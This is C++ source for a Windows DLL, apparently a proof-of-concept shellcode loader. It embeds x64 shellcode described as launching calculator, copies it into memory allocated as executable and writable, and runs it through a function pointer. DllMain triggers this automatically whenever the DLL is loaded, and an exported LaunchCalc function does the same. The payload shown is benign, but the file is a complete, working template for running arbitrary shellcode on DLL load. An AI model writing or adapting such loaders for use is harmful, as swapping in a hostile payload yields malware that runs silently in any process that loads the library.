#include <windows.h>
#include <stdio.h>

// Reliable x64 Windows shellcode for launching calculator
unsigned char calc_shellcode[] = {
    0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63,
    0x54, 0x59, 0x48, 0x83, 0xEC, 0x28, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48,
    0x8B, 0x76, 0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
    0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24,
    0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45,
    0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7,
    0x99, 0xFF, 0xD7, 0x48, 0x83, 0xC4, 0x30, 0x5D, 0x5F, 0x5E, 0x5B, 0x5A, 0x59, 0x58, 0xC3
};

// Execute shellcode directly (without using a thread)
BOOL ExecuteShellcode() {
    // Create diagnostic file
    FILE* f = fopen("C:\\temp\\shellcode_debug.txt", "w");
    if (f) {
        fprintf(f, "Starting shellcode execution...\n");
    }

    // Allocate memory with execution permissions
    void* exec_memory = VirtualAlloc(NULL, sizeof(calc_shellcode),
                                   MEM_COMMIT | MEM_RESERVE,
                                   PAGE_EXECUTE_READWRITE);

    if (exec_memory == NULL) {
        if (f) fprintf(f, "Memory allocation failed: %d\n", GetLastError());
        if (f) fclose(f);
        return FALSE;
    }

    if (f) fprintf(f, "Memory allocated at: %p\n", exec_memory);

    // Copy shellcode to executable memory
    RtlCopyMemory(exec_memory, calc_shellcode, sizeof(calc_shellcode));
    if (f) fprintf(f, "Shellcode copied to memory\n");

    // Execute shellcode using function pointer - direct execution, no thread
    if (f) {
        fprintf(f, "About to execute shellcode (%d bytes)...\n", sizeof(calc_shellcode));
        fclose(f);
    }

    // Create function pointer to shellcode
    void (*shellcode_func)() = (void(*)())exec_memory;

    // Execute the shellcode directly
    shellcode_func();

    // Log completion
    FILE* f2 = fopen("C:\\temp\\shellcode_completed.txt", "w");
    if (f2) {
        fprintf(f2, "Shellcode execution completed\n");
        fclose(f2);
    }

    // Free memory
    VirtualFree(exec_memory, 0, MEM_RELEASE);
    return TRUE;
}

// Standard exported functions
extern "C" {
    __declspec(dllexport) void TestFunction() {
        MessageBoxA(NULL, "TestFunction called!", "TestDLL", MB_OK);
    }

    __declspec(dllexport) int AddNumbers(int a, int b) {
        return a + b;
    }

    // Explicit function to execute shellcode
    __declspec(dllexport) BOOL LaunchCalc() {
        return ExecuteShellcode();
    }
}

// DLL entry point
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        FILE* f = fopen("C:\\temp\\testdll_loaded.txt", "w");
        if (f) {
            fprintf(f, "TestDLL loaded at address: %p\n", hinstDLL);
            fprintf(f, "DLL_PROCESS_ATTACH triggered, about to run shellcode\n");
            fclose(f);
        }

        // Execute shellcode on DLL load
        ExecuteShellcode();
    }
    return TRUE;
}